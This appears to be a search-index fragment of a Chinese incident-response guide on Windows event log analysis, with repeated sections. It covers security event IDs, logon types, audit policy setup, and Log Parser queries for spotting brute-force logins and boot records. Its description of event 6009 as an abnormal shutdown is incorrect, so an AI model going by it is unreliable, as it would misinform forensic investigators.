eventvwr.msc \u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u201c \u4e8b\u4ef6\u67e5\u770b\u5668 \u201d 0x03 \u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790 \u00b6 \u5bf9\u4e8eWindows\u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790\uff0c\u4e0d\u540c\u7684EVENT ID\u4ee3\u8868\u4e86\u4e0d\u540c\u7684\u610f\u4e49\uff0c\u6458\u5f55\u4e00\u4e9b\u5e38\u89c1\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\uff1a \u4e8b\u4ef6ID \u8bf4\u660e 4624 \u767b\u5f55\u6210\u529f 4625 \u767b\u5f55\u5931\u8d25 4634 \u6ce8\u9500\u6210\u529f 4647 \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 4720 \u521b\u5efa\u7528\u6237 \u6bcf\u4e2a\u6210\u529f\u767b\u5f55\u7684\u4e8b\u4ef6\u90fd\u4f1a\u6807\u8bb0\u4e00\u4e2a\u767b\u5f55\u7c7b\u578b\uff0c\u4e0d\u540c\u767b\u5f55\u7c7b\u578b\u4ee3\u8868\u4e0d\u540c\u7684\u65b9\u5f0f\uff1a \u767b\u5f55\u7c7b\u578b \u63cf\u8ff0 \u8bf4\u660e 2 \u4ea4\u4e92\u5f0f\u767b\u5f55\uff08Interactive\uff09 \u7528\u6237\u5728\u672c\u5730\u8fdb\u884c\u767b\u5f55\u3002 3 \u7f51\u7edc\uff08Network\uff09 \u6700\u5e38\u89c1\u7684\u60c5\u51b5\u5c31\u662f\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u5171\u4eab\u6253\u5370\u673a\u65f6\u3002 4 \u6279\u5904\u7406\uff08Batch\uff09 \u901a\u5e38\u8868\u660e\u67d0\u8ba1\u5212\u4efb\u52a1\u542f\u52a8\u3002 5 \u670d\u52a1\uff08Service\uff09 \u6bcf\u79cd\u670d\u52a1\u90fd\u88ab\u914d\u7f6e\u5728\u67d0\u4e2a\u7279\u5b9a\u7684\u7528\u6237\u8d26\u53f7\u4e0b\u8fd0\u884c\u3002 7 \u89e3\u9501\uff08Unlock\uff09 \u5c4f\u4fdd\u89e3\u9501\u3002 8 \u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0c\u5982FTP\u3002 9 \u65b0\u51ed\u8bc1\uff08NewCredentials\uff09 \u4f7f\u7528\u5e26/Netonly\u53c2\u6570\u7684RUNAS\u547d\u4ee4\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u3002 10 \u8fdc\u7a0b\u4ea4\u4e92\uff0c\uff08RemoteInteractive\uff09 \u901a\u8fc7\u7ec8\u7aef\u670d\u52a1\u3001\u8fdc\u7a0b\u684c\u9762\u6216\u8fdc\u7a0b\u534f\u52a9\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002 11 \u7f13\u5b58\u4ea4\u4e92\uff08CachedInteractive\uff09 \u4ee5\u4e00\u4e2a\u57df\u7528\u6237\u767b\u5f55\u800c\u53c8\u6ca1\u6709\u57df\u63a7\u5236\u5668\u53ef\u7528 \u5173\u4e8e\u66f4\u591aEVENT ID\uff0c\u8be6\u89c1\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0a\u627e\u5230\u4e86\u201cWindows Vista \u548c Windows Server 2008 \u4e2d\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\u201d\u3002 \u539f\u6587\u94fe\u63a5 \uff1a https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 \u6848\u4f8b1\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u7cfb\u7edf\u8d26\u53f7\u767b\u5f55\u60c5\u51b5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b \u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u5b89\u5168\u201d**\uff0c\u67e5\u770b\u5b89\u5168\u65e5\u5fd7\uff1b \u5728\u5b89\u5168\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 4624 --\u767b\u5f55\u6210\u529f 4625 --\u767b\u5f55\u5931\u8d25 4634 -- \u6ce8\u9500\u6210\u529f 4647 -- \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 -- \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a4625\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e8b\u4ef6ID\uff1a4625\uff0c\u4e8b\u4ef6\u6570175904\uff0c\u5373\u7528\u6237\u767b\u5f55\u5931\u8d25\u4e86175904\u6b21\uff0c\u90a3\u4e48\u8fd9\u53f0\u670d\u52a1\u5668\u7ba1\u7406\u5458\u8d26\u53f7\u53ef\u80fd\u906d\u9047\u4e86\u66b4\u529b\u731c\u89e3\u3002 \u6848\u4f8b2\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u8ba1\u7b97\u673a\u5f00\u5173\u673a\u7684\u8bb0\u5f55\uff1a 1\u3001\u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b 2\u3001\u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u7cfb\u7edf\u201d**\uff0c\u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\uff1b 3\u3001\u5728\u7cfb\u7edf\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 \u5176\u4e2d\u4e8b\u4ef6ID 6006 ID6005\u3001 ID 6009\u5c31\u8868\u793a\u4e0d\u540c\u72b6\u6001\u7684\u673a\u5668\u7684\u60c5\u51b5\uff08\u5f00\u5173\u673a\uff09\u3002 6005 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u542f\u52a8\u3002(\u5f00\u673a) 6006 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u505c\u6b62\u3002(\u5173\u673a) 6009 \u4fe1\u606f EventLog \u6309ctrl\u3001alt\u3001delete\u952e(\u975e\u6b63\u5e38)\u5173\u673a \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a6005-6006\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e86\u4e24\u6761\u57282018/7/6 17:53:51\u5de6\u53f3\u7684\u8bb0\u5f55\uff0c\u4e5f\u5c31\u662f\u6211\u521a\u624d\u5bf9\u7cfb\u7edf\u8fdb\u884c\u91cd\u542f\u7684\u65f6\u95f4\u3002 0x04 \u65e5\u5fd7\u5206\u6790\u5de5\u5177 \u00b6 Log Parser \u00b6 Log Parser\uff08\u662f\u5fae\u8f6f\u516c\u53f8\u51fa\u54c1\u7684\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff0c\u5b83\u529f\u80fd\u5f3a\u5927\uff0c\u4f7f\u7528\u7b80\u5355\uff0c\u53ef\u4ee5\u5206\u6790\u57fa\u4e8e\u6587\u672c\u7684\u65e5\u5fd7\u6587\u4ef6\u3001XML \u6587\u4ef6\u3001CSV\uff08\u9017\u53f7\u5206\u9694\u7b26\uff09\u6587\u4ef6\uff0c\u4ee5\u53ca\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e8b\u4ef6\u65e5\u5fd7\u3001\u6ce8\u518c\u8868\u3001\u6587\u4ef6\u7cfb\u7edf\u3001Active Directory\u3002\u5b83\u53ef\u4ee5\u50cf\u4f7f\u7528 SQL \u8bed\u53e5\u4e00\u6837\u67e5\u8be2\u5206\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u628a\u5206\u6790\u7ed3\u679c\u4ee5\u5404\u79cd\u56fe\u8868\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 Log Parser 2.2\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser \u4f7f\u7528\u793a\u4f8b\uff1a https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 Logparser.exe \u2013i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\xx.evtx\" \u4f7f\u7528Log Parser\u5206\u6790\u65e5\u5fd7 1\u3001\u67e5\u8be2\u767b\u5f55\u6210\u529f\u7684\u4e8b\u4ef6 \u767b\u5f55\u6210\u529f\u7684\u6240\u6709\u4e8b\u4ef6 LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" \u6307\u5b9a\u767b\u5f55\u65f6\u95f4\u8303\u56f4\u7684\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00' and EventID=4624\" \u63d0\u53d6\u767b\u5f55\u6210\u529f\u7684\u7528\u6237\u540d\u548cIP\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 2\u3001\u67e5\u8be2\u767b\u5f55\u5931\u8d25\u7684\u4e8b\u4ef6 \u767b\u5f55\u5931\u8d25\u7684\u6240\u6709\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" \u63d0\u53d6\u767b\u5f55\u5931\u8d25\u7528\u6237\u540d\u8fdb\u884c\u805a\u5408\u7edf\u8ba1\uff1a LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 3\u3001\u7cfb\u7edf\u5386\u53f2\u5f00\u5173\u673a\u8bb0\u5f55\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\" LogParser Lizard \u00b6 \u5bf9\u4e8eGUI\u73af\u5883\u7684Log Parser Lizard\uff0c\u5176\u7279\u70b9\u662f\u6bd4\u8f83\u6613\u4e8e\u4f7f\u7528\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u8bb0\u5fc6\u7e41\u7410\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u8981\u505a\u597d\u8bbe\u7f6e\uff0c\u5199\u597d\u57fa\u672c\u7684SQL\u8bed\u53e5\uff0c\u5c31\u53ef\u4ee5\u76f4\u89c2\u7684\u5f97\u5230\u7ed3\u679c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.lizard-labs.com/log_parser_lizard.aspx \u4f9d\u8d56\u5305\uff1aMicrosoft .NET Framework 4 .5\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=42642 \u67e5\u8be2\u6700\u8fd1\u7528\u6237\u767b\u5f55\u60c5\u51b5\uff1a Event Log Explorer \u00b6 Event Log Explorer\u662f\u4e00\u6b3e\u975e\u5e38\u597d\u7528\u7684Windows\u65e5\u5fd7\u5206\u6790\u5de5\u5177\u3002\u53ef\u7528\u4e8e\u67e5\u770b\uff0c\u76d1\u89c6\u548c\u5206\u6790\u8ddf\u4e8b\u4ef6\u8bb0\u5f55\uff0c\u5305\u62ec\u5b89\u5168\uff0c\u7cfb\u7edf\uff0c\u5e94\u7528\u7a0b\u5e8f\u548c\u5176\u4ed6\u5fae\u8f6fWindows \u7684\u8bb0\u5f55\u88ab\u8bb0\u8f7d\u7684\u4e8b\u4ef6\uff0c\u5176\u5f3a\u5927\u7684\u8fc7\u6ee4\u529f\u80fd\u53ef\u4ee5\u5feb\u901f\u7684\u8fc7\u6ee4\u51fa\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://event-log-explorer.en.softonic.com/ \u53c2\u8003\u94fe\u63a5\uff1a Windows\u65e5\u5fd7\u5206\u6790 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ","title":"\u7b2c1\u7bc7\uff1aWindows\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#\u7b2c1\u7bc7windows\u65e5\u5fd7\u5206\u6790","text":"","title":"\u7b2c1\u7bc7:Windows\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-windows\u4e8b\u4ef6\u65e5\u5fd7\u7b80\u4ecb","text":"Windows\u7cfb\u7edf\u65e5\u5fd7\u662f\u8bb0\u5f55\u7cfb\u7edf\u4e2d\u786c\u4ef6\u3001\u8f6f\u4ef6\u548c\u7cfb\u7edf\u95ee\u9898\u7684\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u76d1\u89c6\u7cfb\u7edf\u4e2d\u53d1\u751f\u7684\u4e8b\u4ef6\u3002\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u68c0\u67e5\u9519\u8bef\u53d1\u751f\u7684\u539f\u56e0\uff0c\u6216\u8005\u5bfb\u627e\u53d7\u5230\u653b\u51fb\u65f6\u653b\u51fb\u8005\u7559\u4e0b\u7684\u75d5\u8ff9\u3002 Windows\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u7c7b\u65e5\u5fd7\u8bb0\u5f55\u7cfb\u7edf\u4e8b\u4ef6\uff1a\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\u548c\u5b89\u5168\u65e5\u5fd7\u3002 \u7cfb\u7edf\u65e5\u5fd7 \u8bb0\u5f55\u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\u4ea7\u751f\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\u3001\u7cfb\u7edf\u7ec4\u4ef6\u548c\u5e94\u7528\u8f6f\u4ef6\u7684\u5d29\u6e83\u4ee5\u53ca\u6570\u636e\u4e22\u5931\u9519\u8bef\u7b49\u3002\u7cfb\u7edf\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u7684\u65f6\u95f4\u7c7b\u578b\u7531Windows\u2002NT/2000\u64cd\u4f5c\u7cfb\u7edf\u9884\u5148\u5b9a\u4e49\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 \u5305\u542b\u7531\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u7a0b\u5e8f\u8bb0\u5f55\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u8bb0\u5f55\u7a0b\u5e8f\u8fd0\u884c\u65b9\u9762\u7684\u4e8b\u4ef6\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u7a0b\u5e8f\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u6587\u4ef6\u9519\u8bef\uff0c\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u81ea\u884c\u51b3\u5b9a\u76d1\u89c6\u54ea\u4e9b\u4e8b\u4ef6\u3002\u5982\u679c\u67d0\u4e2a\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u5d29\u6e83\u60c5\u51b5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ece\u7a0b\u5e8f\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u627e\u5230\u76f8\u5e94\u7684\u8bb0\u5f55\uff0c\u4e5f\u8bb8\u4f1a\u6709\u52a9\u4e8e\u4f60\u89e3\u51b3\u95ee\u9898\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx \u5b89\u5168\u65e5\u5fd7 \u8bb0\u5f55\u7cfb\u7edf\u7684\u5b89\u5168\u5ba1\u8ba1\u4e8b\u4ef6\uff0c\u5305\u542b\u5404\u79cd\u7c7b\u578b\u7684\u767b\u5f55\u65e5\u5fd7\u3001\u5bf9\u8c61\u8bbf\u95ee\u65e5\u5fd7\u3001\u8fdb\u7a0b\u8ffd\u8e2a\u65e5\u5fd7\u3001\u7279\u6743\u4f7f\u7528\u3001\u5e10\u53f7\u7ba1\u7406\u3001\u7b56\u7565\u53d8\u66f4\u3001\u7cfb\u7edf\u4e8b\u4ef6\u3002\u5b89\u5168\u65e5\u5fd7\u4e5f\u662f\u8c03\u67e5\u53d6\u8bc1\u4e2d\u6700\u5e38\u7528\u5230\u7684\u65e5\u5fd7\u3002\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u5b89\u5168\u6027\u65e5\u5fd7\u662f\u5173\u95ed\u7684\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u7ec4\u7b56\u7565\u6765\u542f\u52a8\u5b89\u5168\u6027\u65e5\u5fd7\uff0c\u6216\u8005\u5728\u6ce8\u518c\u8868\u4e2d\u8bbe\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u4ee5\u4fbf\u5f53\u5b89\u5168\u6027\u65e5\u5fd7\u6ee1\u540e\u4f7f\u7cfb\u7edf\u505c\u6b62\u54cd\u5e94\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx \u200b \u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u5b58\u50a8\u7740\u6545\u969c\u6392\u9664\u4fe1\u606f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u66f4\u4e3a\u6709\u7528\u3002 \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\uff0c\u5bf9\u4e8e\u8c03\u67e5\u4eba\u5458\u800c\u8a00\uff0c\u66f4\u6709\u5e2e\u52a9\u3002","title":"0x01 Windows\u4e8b\u4ef6\u65e5\u5fd7\u7b80\u4ecb"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02-\u5ba1\u6838\u7b56\u7565\u4e0e\u4e8b\u4ef6\u67e5\u770b\u5668","text":"Windows Server 2008 R2 \u7cfb\u7edf\u7684\u5ba1\u6838\u529f\u80fd\u5728\u9ed8\u8ba4\u72b6\u6001\u4e0b\u5e76\u6ca1\u6709\u542f\u7528 \uff0c\u5efa\u8bae\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 PS\uff1a\u9ed8\u8ba4\u72b6\u6001\u4e0b\uff0c\u4e5f\u4f1a\u8bb0\u5f55\u4e00\u4e9b\u7b80\u5355\u7684\u65e5\u5fd7\uff0c\u65e5\u5fd7\u9ed8\u8ba4\u5927\u5c0f20M \u8bbe\u7f6e1 \uff1a\u5f00\u59cb \u2192 \u7ba1\u7406\u5de5\u5177 \u2192 \u672c\u5730\u5b89\u5168\u7b56\u7565 \u2192 \u672c\u5730\u7b56\u7565 \u2192 \u5ba1\u6838\u7b56\u7565\uff0c\u53c2\u8003\u914d\u7f6e\u64cd\u4f5c\uff1a \u8bbe\u7f6e2 \uff1a\u8bbe\u7f6e\u5408\u7406\u7684\u65e5\u5fd7\u5c5e\u6027\uff0c\u5373\u65e5\u5fd7\u6700\u5927\u5927\u5c0f\u3001\u4e8b\u4ef6\u8986\u76d6\u9600\u503c\u7b49\uff1a \u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\u65b9\u6cd5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d** \u6309 \" Window+R \"\uff0c\u8f93\u5165 \u201d eventvwr.msc \u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u201c \u4e8b\u4ef6\u67e5\u770b\u5668 \u201d","title":"0X02 \u5ba1\u6838\u7b56\u7565\u4e0e\u4e8b\u4ef6\u67e5\u770b\u5668"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x03-\u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790","text":"\u5bf9\u4e8eWindows\u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790\uff0c\u4e0d\u540c\u7684EVENT ID\u4ee3\u8868\u4e86\u4e0d\u540c\u7684\u610f\u4e49\uff0c\u6458\u5f55\u4e00\u4e9b\u5e38\u89c1\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\uff1a \u4e8b\u4ef6ID \u8bf4\u660e 4624 \u767b\u5f55\u6210\u529f 4625 \u767b\u5f55\u5931\u8d25 4634 \u6ce8\u9500\u6210\u529f 4647 \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 4720 \u521b\u5efa\u7528\u6237 \u6bcf\u4e2a\u6210\u529f\u767b\u5f55\u7684\u4e8b\u4ef6\u90fd\u4f1a\u6807\u8bb0\u4e00\u4e2a\u767b\u5f55\u7c7b\u578b\uff0c\u4e0d\u540c\u767b\u5f55\u7c7b\u578b\u4ee3\u8868\u4e0d\u540c\u7684\u65b9\u5f0f\uff1a \u767b\u5f55\u7c7b\u578b \u63cf\u8ff0 \u8bf4\u660e 2 \u4ea4\u4e92\u5f0f\u767b\u5f55\uff08Interactive\uff09 \u7528\u6237\u5728\u672c\u5730\u8fdb\u884c\u767b\u5f55\u3002 3 \u7f51\u7edc\uff08Network\uff09 \u6700\u5e38\u89c1\u7684\u60c5\u51b5\u5c31\u662f\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u5171\u4eab\u6253\u5370\u673a\u65f6\u3002 4 \u6279\u5904\u7406\uff08Batch\uff09 \u901a\u5e38\u8868\u660e\u67d0\u8ba1\u5212\u4efb\u52a1\u542f\u52a8\u3002 5 \u670d\u52a1\uff08Service\uff09 \u6bcf\u79cd\u670d\u52a1\u90fd\u88ab\u914d\u7f6e\u5728\u67d0\u4e2a\u7279\u5b9a\u7684\u7528\u6237\u8d26\u53f7\u4e0b\u8fd0\u884c\u3002 7 \u89e3\u9501\uff08Unlock\uff09 \u5c4f\u4fdd\u89e3\u9501\u3002 8 \u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0c\u5982FTP\u3002 9 \u65b0\u51ed\u8bc1\uff08NewCredentials\uff09 \u4f7f\u7528\u5e26/Netonly\u53c2\u6570\u7684RUNAS\u547d\u4ee4\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u3002 10 \u8fdc\u7a0b\u4ea4\u4e92\uff0c\uff08RemoteInteractive\uff09 \u901a\u8fc7\u7ec8\u7aef\u670d\u52a1\u3001\u8fdc\u7a0b\u684c\u9762\u6216\u8fdc\u7a0b\u534f\u52a9\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002 11 \u7f13\u5b58\u4ea4\u4e92\uff08CachedInteractive\uff09 \u4ee5\u4e00\u4e2a\u57df\u7528\u6237\u767b\u5f55\u800c\u53c8\u6ca1\u6709\u57df\u63a7\u5236\u5668\u53ef\u7528 \u5173\u4e8e\u66f4\u591aEVENT ID\uff0c\u8be6\u89c1\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0a\u627e\u5230\u4e86\u201cWindows Vista \u548c Windows Server 2008 \u4e2d\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\u201d\u3002 \u539f\u6587\u94fe\u63a5 \uff1a https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 \u6848\u4f8b1\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u7cfb\u7edf\u8d26\u53f7\u767b\u5f55\u60c5\u51b5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b \u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u5b89\u5168\u201d**\uff0c\u67e5\u770b\u5b89\u5168\u65e5\u5fd7\uff1b \u5728\u5b89\u5168\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 4624 --\u767b\u5f55\u6210\u529f 4625 --\u767b\u5f55\u5931\u8d25 4634 -- \u6ce8\u9500\u6210\u529f 4647 -- \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 -- \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 